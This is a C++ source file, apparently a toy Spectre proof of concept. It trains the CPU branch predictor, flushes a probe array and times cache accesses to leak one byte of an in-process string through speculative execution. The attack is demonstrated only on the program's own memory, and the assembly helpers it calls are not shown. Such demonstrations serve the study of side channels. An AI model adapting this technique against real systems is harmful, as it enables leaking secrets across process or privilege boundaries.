#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include <cstdint>

extern "C" {
  uint64_t memory_access(void *target);
  void branch_predictor(uint64_t relative_target,
                        void *basepos,
                        uint64_t *comparer,
                        void *probe_start);
}

const char TheAnswer[] = "Answer to the Ultimate Question of Life, The Universe, and Everything is 42";
constexpr int probe_lines = 256;
uint64_t tat[probe_lines];
uint8_t probe[probe_lines * 4096];

void spectre_toy(const void *target_address) {
  uint64_t comparer = 1;
  uint8_t gateway[] = {0};

  for (int trial = 0; ; ++trial) {
    for (int i = 0; i < probe_lines; i++)
      _mm_clflush(&probe[i * 4096]);

    uint64_t train_and_attack[12] = {};
    train_and_attack[5]
      = train_and_attack[11]
      = reinterpret_cast<uint64_t>(target_address) - reinterpret_cast<uint64_t>(gateway);

    for (auto x : train_and_attack) {
      _mm_clflush(&comparer);
      branch_predictor(x, gateway, &comparer, probe);
    }

    for (int i = 0; i < probe_lines; i++)
      tat[i] = memory_access(&probe[i * 4096]);

    int idx_min = 1;
    for (int i = 1; i < probe_lines; ++i)
      if (tat[i] < tat[idx_min]) idx_min = i;

    if (tat[idx_min] < 100) {
      printf("trial#%d: guess='%c' (score=%llu)\n", trial, idx_min, tat[idx_min]);
      for (int i = 0; i < probe_lines; ++i) {
        if ((i + 1) % 16 == 0)
          printf("% 6llu\n", tat[i]);
        else
          printf("% 6llu", tat[i]);
      }
      break;
    }
  }
}

int main(int argc, const char **argv) {
  spectre_toy(TheAnswer + (argc >= 2 ? atoi(argv[1]) : 0));
  return 0;
}
